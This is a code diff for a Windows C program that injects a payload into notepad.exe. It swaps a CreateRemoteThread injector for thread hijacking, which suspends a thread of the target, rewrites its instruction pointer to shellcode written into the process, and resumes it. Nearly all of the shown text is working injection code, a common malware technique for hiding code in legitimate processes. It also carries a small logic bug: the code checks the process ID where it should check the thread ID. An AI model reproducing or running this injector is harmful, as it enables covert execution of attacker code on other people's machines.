@@ -1,8 +1,8 @@
-#include <windows.h>
+#include <Windows.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>
 #include <tlhelp32.h>
+#include <string.h>
 
 #define TARGET "notepad.exe"
 
@@ -83,93 +83,139 @@ DWORD find_pid(const char* procname) {
     return pid;
 }
 
-// Inject payload into process
-int inject_proc(DWORD pid) {
-    DWORD bWritten = 0;
-
-    // Opens an existing local process object.
-    // See: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
-    HANDLE hProc = OpenProcess(
-        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, // Process Access Rights
-        FALSE, // Do not inherit handle     
-        pid    // PID of process to open
-    );
-
-    if (INVALID_HANDLE_VALUE == hProc) {
-        fprintf(stderr, "[!] OpenProcess() failed (0x%x)\n", GetLastError());
-        return -1;
-    }
-
-    // Reserves, commits, or changes the state of a 
-    // region of memory within the virtual address space of a specified process. 
-    LPVOID pRemoteCode = VirtualAllocEx(
-        hProc,                  // Handle to process to allocate memory to
-        NULL,                   // No desired starting address
-        payload_len,            // Size of memory to allocate
-        MEM_COMMIT,             // Make the specified memory range available for use by the process
-        PAGE_EXECUTE_READ       // R+X 
-    );
-        
-    if (NULL == pRemoteCode) {
-        fprintf(stderr, "[!] VirtualAllocEx() failed (0x%x)\n", GetLastError());
-        CloseHandle(hProc);
-        return -1;
-    }
-
-    // Writes data to an area of memory in a specified process.
-    // See: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
-    BOOL result = WriteProcessMemory(
-        hProc,                  // Handle to the process memory to be modified.
-        pRemoteCode,            // Pointer to the base address in the specified process to which data is written
-        (PVOID)payload,         // Pointer to the buffer that contains data to be written
-        (SIZE_T)payload_len,    // The number of bytes to be written
-        (SIZE_T *)&bWritten
-    );
-
-    if (bWritten != payload_len) {
-        fprintf(stderr, "[!] WriteProcessMemory() failed to write complete payload (0x%x)\n", GetLastError());
-        CloseHandle(hProc);
-        return -2;
-    }
-        
+// Find thread ID in a process
+DWORD find_threadid(DWORD pid) {
+    THREADENTRY32 thEntry;
+    thEntry.dwSize = sizeof(THREADENTRY32);
+    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    BOOL result = Thread32First(hThreadSnap, &thEntry);
     if (!result) {
-        fprintf(stderr, "[!] WriteProcessMemory() failed (0x%x)\n", GetLastError());
-        CloseHandle(hProc);
-        return -3;
+        fprintf(stderr, "[!] Thread32First() failed (0x%x)\n", GetLastError());
+        CloseHandle(hThreadSnap);
+        return 0;
     }
 
-    // Creates a thread that runs in the virtual address space of another process.
-    // See: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
-    HANDLE hThread = CreateRemoteThread(
-        hProc,              // Handle to process
-        NULL,               // Thread gets a default security descriptor and the handle cannot be inherited
-        0,                  // Use default stack size
-        pRemoteCode,        // Pointer to memory where payload is written
-        NULL,               // No variables to be passed to the thread function
-        0,                  // The thread runs immediately after creation
-        NULL                // The thread identifier is not returned
-    );
-
-    if (hThread == NULL) {
-        fprintf(stderr, "[!] CreateRemoteThread() failed (0x%x)\n", GetLastError());
-        CloseHandle(hProc);
-        return -4;
+    while (Thread32Next(hThreadSnap, &thEntry)) {
+        if (thEntry.th32OwnerProcessID == pid) {
+            HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID); 
+            if (hThread != INVALID_HANDLE_VALUE) {
+                CloseHandle(hThread);
+                CloseHandle(hThreadSnap);
+                return thEntry.th32ThreadID;
+            }
+            CloseHandle(hThread);
+        }
     }
-
-    // Wait for thread to finish execution
-    int _result = WaitForSingleObject(hThread, -1);
-    if (_result == WAIT_FAILED) {
-        fprintf(stderr, "[!] WaitForSingleObject() failed (0x%x)\n", GetLastError());
-        CloseHandle(hThread);        
-        CloseHandle(hProc);
-        return -5;
-    } 
-    CloseHandle(hThread);
-    CloseHandle(hProc);
+    CloseHandle(hThreadSnap);
     return 0;
 }
 
-int main(void) {
+int inject_proc(DWORD pid) {
+    CONTEXT ctx;
+    DWORD dResult;
+    BOOL bResult;
+    DWORD bWritten = 0;
+
+    DWORD thId = find_threadid(pid);
+    if (pid == 0) {
+        fprintf(stderr, "[!] Could not find any valid ThreadID's\n");
+        return -1;
+    }
+
+    // Open Handle to Thread
+    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thId);
+    if (hThread == INVALID_HANDLE_VALUE) {
+        fprintf(stderr, "[!] OpenThread() failed (0x%x)\n", GetLastError());
+        return -1;
+    }
+
+    printf("[i] Found Thread with ID: %d\n", thId);
+
+    // Open Handle to Process
+    HANDLE hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
+                        PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
+                        FALSE, (DWORD) pid);
+    if (hProcess == INVALID_HANDLE_VALUE) {
+        fprintf(stderr, "[!] OpenProcess() failed (0x%x)\n", GetLastError());
+        CloseHandle(hThread);
+        return -1;
+    }
+
+    // Allocate memory in remote process
+    LPVOID pRemoteCode =  VirtualAllocEx(hProcess, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
+    if (pRemoteCode == NULL) {
+        fprintf(stderr, "[!] VirtualAllocEx() failed (0x%x)\n", GetLastError());
+        CloseHandle(hProcess);
+        CloseHandle(hThread);
+        return -1;
+    }
+
+    bResult = WriteProcessMemory(hProcess, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) &bWritten);
+    if (bWritten != payload_len) {
+        fprintf(stderr, "[!] WriteProcessMemory() failed to write complete payload (0x%x)\n", GetLastError());
+        CloseHandle(hProcess);
+        CloseHandle(hThread);
+        return -1;
+    }
+        
+    if (!bResult) {
+        fprintf(stderr, "[!] WriteProcessMemory() failed (0x%x)\n", GetLastError());
+        CloseHandle(hProcess);
+        CloseHandle(hThread);
+        return -1;
+    }
+    
+    // Suspends the specified thread.
+    dResult = SuspendThread(hThread);
+    if (dResult == (DWORD)-1) {
+        fprintf(stderr, "[!] WriteProcessMemory() failed (0x%x)\n", GetLastError());
+        CloseHandle(hProcess);
+        CloseHandle(hThread);
+        return -1;
+    }
+
+    ctx.ContextFlags = CONTEXT_FULL;   // retrieve all the necessary information about the thread's execution state
+
+    // Retrieves the context of the specified thread.
+    bResult = GetThreadContext(hThread, &ctx);
+    if (!bResult) {
+        fprintf(stderr, "[!] GetThreadContext() failed (0x%x)\n", GetLastError());
+        CloseHandle(hProcess);
+        CloseHandle(hThread);
+        return -1;
+    }
+
+    // Set instruction pointer to the location of our payload
+    #ifdef _M_IX86 
+        ctx.Eip = (DWORD_PTR) pRemoteCode;
+    #else
+        ctx.Rip = (DWORD_PTR) pRemoteCode;
+    #endif
+
+    // Set the new context of the thread
+    bResult = SetThreadContext(hThread, &ctx);
+    if (!bResult) {
+        fprintf(stderr, "[!] SetThreadContext() failed (0x%x)\n", GetLastError());
+        CloseHandle(hProcess);
+        CloseHandle(hThread);
+        return -1;
+    }
+
+    // Resume Thread
+    dResult = ResumeThread(hThread);
+    if (dResult == (DWORD)-1) {
+        fprintf(stderr, "[!] ResumeThread() failed (0x%x)\n", GetLastError());
+        CloseHandle(hProcess);
+        CloseHandle(hThread);
+        return -1;
+    }
+
+    CloseHandle(hProcess);
+    CloseHandle(hThread);
+    return 0;
+}
+
+int main() {
     DWORD pid = find_pid(TARGET);
     
     if (pid == 0) {
@@ -180,10 +226,9 @@ int main(void) {
     printf("[i] %s: %d\n", TARGET, pid);
 
     int result = inject_proc(pid);
-    if (result < 0) {
-        fprintf(stderr, "[!] Failed to inject payload\n");
-        return -2;
-    }
-    printf("[i] Injection Complete!\n");
+    if (result != 0) 
+        fprintf(stderr, "[!] Injection failed\n");
+    else 
+        printf("[i] Injection successful!\n");
     return 0;
 }
